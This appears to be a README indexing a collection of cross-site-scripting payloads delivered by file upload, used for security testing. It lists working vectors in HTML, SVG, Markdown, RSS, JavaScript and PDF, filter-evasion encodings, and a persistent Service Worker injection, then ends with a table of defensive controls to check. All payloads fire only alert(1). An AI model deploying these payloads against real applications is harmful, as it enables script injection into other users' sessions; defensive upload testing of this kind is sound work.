# XSS Payloads

Payloads for testing **Cross-Site Scripting via file upload**. These test whether an application serves uploaded files in a context where script executes — HTML/SVG rendered inline, PDF opened in a viewer with JavaScript enabled, or JS files executed in the browser's origin. All payloads use `alert(1)` as the proof-of-execution primitive.

---

## Attack Surface

XSS via upload occurs when:
- Uploaded HTML, SVG, or XHTML is served directly from the application's origin without `Content-Disposition: attachment`
- A Markdown renderer inlines raw HTML from uploaded `.md` files
- A PHP/SHTML file is executed and its output rendered
- An RSS/XML feed is parsed and its content inserted into the DOM without sanitisation
- An uploaded PDF is opened in a viewer with PDF JavaScript enabled
- An uploaded JS file is served and executed in the origin's context (e.g. registered as a Service Worker)

---

## Payload Index

### Extension / Format Variants

These test whether a particular file type is served with an executable `Content-Type` or rendered inline. All contain a basic `alert(1)`.

| File | Content | Key condition for execution |
|---|---|---|
| `xss.html` | `<html><body><script>alert(1)</script></body></html>` | Served as `text/html` without `Content-Disposition: attachment` |
| `xss.htm` | `<script>alert(1)</script>` | Same as `.html`; tests whether `.htm` is treated identically |
| `xss.svg` | `<svg><script>alert(1)</script></svg>` | Served as `image/svg+xml` and rendered directly (not via `<img>`) |
| `xss.xhtml` | Full XHTML document with `<script>` | Served as `application/xhtml+xml` or `text/html` |
| `xss.xml` | `<script xmlns="...xhtml">alert(1)</script>` | XML parsed with XHTML namespace and rendered |
| `xss.shtml` | `<script>alert(1)</script>` | Apache SSI execution enabled for `.shtml` |
| `xss.php` | `<?php echo "<script>alert(1)</script>"; ?>` | PHP execution enabled; output rendered |
| `xss.js` | `alert(1)` | File executed as a script (e.g. Service Worker registration, `<script src>`) |
| `xss.md` | `<script>` + `<img onerror>` | Markdown renderer inlines raw HTML |
| `xss.rss` | `<title><![CDATA[</title><script>alert(1)</script>]]>` | RSS parser inserts CDATA content into DOM without escaping |

---

### SVG-Specific Vectors

| File | Mechanism | Notes |
|---|---|---|
| `xss_onload.svg` | `<svg onload="alert(1)"/>` | Fires immediately on render — no click required |
| `xss_svg_a.svg` | `<a xlink:href="javascript:alert(1)">` | Clickable JS link in SVG |
| `xss_svg_animate.svg` | `<animate onbegin="alert(1)"/>` | SMIL animation event — fires when animation begins |
| `xss_svg_foreignobject.svg` | `<foreignObject><script>alert(1)</script></foreignObject>` | XHTML `<script>` inside SVG foreignObject — bypasses SVG-specific sanitisers that don't inspect foreignObject content |
| `xss_svg_set.svg` | `<set attributeName="onmouseover" to="alert(1)"/>` | SMIL `<set>` injects an event handler attribute onto the target element |
| `xss_svg_use.svg` | `<defs><script id="x">alert(1)</script></defs><use xlink:href="#x"/>` | Executes a script stored in `<defs>` via `<use>` reference |

---

### HTML Element Vectors

One payload per element or attribute, for testing element-specific sanitiser rules.

#### Media & Embed

| File | Payload | Trigger |
|---|---|---|
| `xss_img.html` | `<img src=x onerror=alert(1)>` | Passive — fires on failed image load |
| `xss_audio.html` | `<audio src=x onerror=alert(1)>` | Passive — fires on failed audio load |
| `xss_video.html` | `<video src=x onerror=alert(1)>` | Passive — fires on failed video load |
| `xss_picture.html` | `<picture><source onerror=alert(1)><img onerror=alert(1)>` | Two `onerror` vectors in a single `<picture>` element |
| `xss_embed.html` | `<embed src="javascript:alert(1)">` | `javascript:` URI in embed `src` |
| `xss_object.html` | `<object data="javascript:alert(1)">` | `javascript:` URI in object `data` |

#### Forms & Inputs

| File | Payload | Trigger |
|---|---|---|
| `xss_input.html` | `<input autofocus onfocus=alert(1)>` | Passive — `autofocus` fires `onfocus` on load |
| `xss_select.html` | `<select autofocus onfocus=alert(1)>` | Passive — same technique on `<select>` |
| `xss_textarea.html` | `<textarea autofocus onfocus=alert(1)>` | Passive — same technique on `<textarea>` |
| `xss_form.html` | `<button formaction="javascript:alert(1)">` | Click required — `formaction` overrides form's action |
| `xss_details.html` | `<details open ontoggle=alert(1)>` | Passive — `open` attribute triggers `ontoggle` immediately |

#### Navigation & CSS

| File | Payload | Notes |
|---|---|---|
| `xss_anchor.html` | `<a href="javascript:alert(1)">` + auto-click script | `javascript:` URI; auto-clicked by inline script |
| `xss_base.html` | `<base href="javascript:alert(1)//">` + `<a href="/x">` | Hijacks all relative href/src in the document to `javascript:` |
| `xss_link.html` | `<link rel="stylesheet" href="javascript:alert(1)">` | `javascript:` URI in stylesheet link |
| `xss_meta.html` | `<meta http-equiv="refresh" content="0;url=javascript:alert(1)">` | Meta-refresh to `javascript:` URI |
| `xss_style.html` | `<style>*{background:url(javascript:alert(1))}</style>` | CSS `url()` with `javascript:` — executed in older IE/legacy browsers |
| `xss_import.css` | `background: url("javascript:...")` + `@import "javascript:..."` | Standalone `.css` upload; tests CSS `javascript:` URI and `@import` |

#### Page & Structural

| File | Payload | Notes |
|---|---|---|
| `xss_onload.html` | `<body onload=alert(1)>` | Fires on document load |
| `xss_iframe.html` | `<iframe srcdoc="<script>alert(1)</script>">` | Script inside `srcdoc` attribute (same-origin) |
| `xss_table.html` | `<table background="javascript:alert(1)">` | Legacy IE `background` attribute |
| `xss_marquee.html` | `<marquee onstart=alert(1)>` | Non-standard `onstart` event on `<marquee>` |
| `xss_animation.html` | `<div onanimationstart=alert(1)>` + `@keyframes` | CSS animation fires DOM event |

---

### Obfuscation & Encoding Vectors

Used to bypass WAFs and sanitisers that detect literal `alert`, `script`, or `javascript` strings.

| File | Technique | Payload |
|---|---|---|
| `xss_base64.html` | Base64 + `eval(atob(...))` | `eval(atob('YWxlcnQoMSk='))` |
| `xss_charcode.html` | `String.fromCharCode` | `eval(String.fromCharCode(97,108,101,114,116,40,49,41))` |
| `xss_hex.html` | Hex escape sequences | `eval('\x61\x6c\x65\x72\x74\x28\x31\x29')` |
| `xss_unicode.html` | Unicode escape in identifier | `\u0061lert(1)` — `\u0061` = `a` |
| `xss_template_literal.html` | String split across template literals | `` let f=`ale`+`rt`;window[f](1) `` |
| `xss_datauri.html` | `data:` URI in `<script src>` | `<script src="data:text/javascript,alert(1)">` |
| `xss_srcdoc.html` | HTML entity encoding in `srcdoc` | `<iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert(1)...">` |
| `xss_polyglot.html` | HTML comment injection | `<!--<img src="--><script>alert(1)</script>">` |
| `xss_polyglot.gif` | GIF89a magic bytes + HTML | Valid GIF header (`GIF89a`) prepended to XSS payload — tests magic-byte validation |

---

### DOM & JavaScript Technique Vectors

| File | Technique | Notes |
|---|---|---|
| `xss_dom.html` | `innerHTML` sink | `innerHTML = decodeURIComponent('<img src=x onerror=alert(1)>')` — simulates DOM XSS via a URL-decoded source |
| `xss_constructor.html` | `Function` constructor chain | `[].constructor.constructor('alert(1)')()` — reaches `Function` without writing `Function` literally |
| `xss_proto.js` | Prototype pollution | `Object.prototype.innerHTML = '<img onerror=alert(1)>'` — poisons all objects; fires when any code does `obj.innerHTML = ''` |
| `xss_postmessage.html` | `postMessage` → `eval` | `window.addEventListener('message', e => eval(e.data))` then posts `alert(1)` — tests unsafe `postMessage` handlers |
| `xss_popstate.html` | `window.onpopstate` | Registers handler then triggers it via `history.pushState` + `history.back()` |
| `xss_redirect.html` | `location` assignment | `location='javascript:alert(1)'` — navigates to `javascript:` URI |
| `xss_setter.html` | `Object.defineProperty` setter | Defines a setter on `window.x`; calling `x = fn` invokes it |
| `xss_template.html` | Client-side template injection | `{{constructor.constructor('alert(1)')()}}` — Angular/Vue/Handlebars-style template payload embedded in HTML |
| `xss_wasm_glue.js` | `new Function()` | `new Function('alert(1)')()` — creates and immediately invokes an anonymous function |
| `xss_sw.js` | Service Worker response injection | SW intercepts all fetch requests and responds with `<script>alert(1)</script>` — persists XSS across page loads if the SW is registered on the app origin |

---

### PDF JavaScript XSS

PDF JavaScript runs in the Acrobat/Reader sandbox and cannot directly access the browser DOM, but executes in the context of the PDF viewer. `app.alert()` produces a visible dialog. These are used to demonstrate that a PDF accepted by the upload endpoint can execute JavaScript in the viewer.

| File | JS Payload | What It Demonstrates |
|---|---|---|
| `xss_pdf_alert.pdf` | `app.alert(1)` | Baseline — confirms PDF JS execution |
| `xss_pdf_alert_msg.pdf` | `app.alert("XSS PoC")` | Alert with custom string |
| `xss_pdf_console.pdf` | `console.println("XSS"); app.alert(1)` | Console output + alert |
| `xss_pdf_eval.pdf` | `eval("app.alert(1)")` | `eval()`-based execution |
| `xss_pdf_timeout.pdf` | `app.setTimeOut("app.alert(1)", 0)` | Deferred execution via timeout — may bypass eager static analysis |
| `xss_pdf_url.pdf` | `this.getURL("javascript:alert(1)")` | `javascript:` URI via `getURL` |
| `xss_pdf_geturl.pdf` | `app.launchURL("javascript:alert(1)", true)` | `javascript:` URI via `launchURL` |
| `xss_pdf_submit.pdf` | `this.submitForm({cURL:"javascript:alert(1)", cSubmitAs:"HTML"})` | Form submission to `javascript:` URI |
| `xss_pdf_field.pdf` | `this.getField("nonexistent")` + alert if null | Accesses AcroForm field; demonstrates object model access |
| `xss_pdf_version.pdf` | `app.alert(app.version + "\|" + app.platform)` | **Info disclosure** — leaks Acrobat version and OS platform |
| `xss_pdf_info.pdf` | `app.alert(this.title + "\|" + this.author)` | **Info disclosure** — leaks document metadata (title, author) |
| `xss_pdf_priv.pdf` | `app.getPath("user","temp")` | **Privileged path access** — leaks the user's temp directory path |
| `xss_pdf_xmp.pdf` | `app.alert(this.info.Subject \|\| "XSS via metadata")` | Reads XMP/document metadata into the alert |
| `xss_pdf_print.pdf` | `app.alert(1); this.print({bUI:false, bSilent:true})` | Triggers silent print alongside alert |
| `xss_pdf_obfuscated.pdf` | Obfuscated JS | Obfuscated payload — tests whether the PDF scanner inspects decoded JS content |

---

## Passive vs. Interaction-Required

| Category | Passive (fires on load/open) | Requires interaction |
|---|---|---|
| HTML | `xss_img`, `xss_audio`, `xss_video`, `xss_onload`, `xss_input` (autofocus), `xss_select` (autofocus), `xss_textarea` (autofocus), `xss_details`, `xss_animation`, `xss_meta`, `xss_base64`, `xss_charcode`, `xss_hex` | `xss_anchor`, `xss_form` |
| SVG | `xss_onload.svg`, `xss_svg_animate.svg` | `xss_svg_a.svg`, `xss_svg_set.svg` (mouseover) |
| PDF | `xss_pdf_alert`, `xss_pdf_eval`, `xss_pdf_timeout`, `xss_pdf_version`, `xss_pdf_info`, `xss_pdf_print`, `xss_pdf_xmp`, `xss_pdf_obfuscated` | `xss_pdf_field` (form interaction), `xss_pdf_submit` |

---

## What to Test For

| Control | Passes if… |
|---|---|
| HTML served with `Content-Disposition: attachment` | Browser downloads the file rather than rendering it |
| `X-Content-Type-Options: nosniff` | Browser does not sniff content type of uploaded files |
| SVG served without inline rendering | SVG is either served with `Content-Disposition: attachment` or only embedded via `<img>` (which blocks script) |
| Markdown sanitiser strips raw HTML | `<script>` and `onerror` attributes in `.md` files are removed or escaped |
| RSS content HTML-escaped in DOM | CDATA/title content is text-encoded before DOM insertion |
| PDF JS disabled in viewer/processor | `app.alert()` and related PDF JS APIs are unavailable |
| Service Worker upload blocked or restricted | `.js` uploads cannot be registered as a SW on the application origin |
| CSP enforced | `script-src` and `default-src` directives prevent inline and injected script execution |

---

## Related Sections

- [`../SSRF/`](../SSRF/) — SVG payloads focused on outbound server-side fetch rather than script execution
- [`../Open Redirect/`](../Open%20Redirect/) — PDF and HTML redirect payloads
- [`../SSTI/`](../SSTI/) — Server-side template injection (vs. client-side `xss_template.html`)
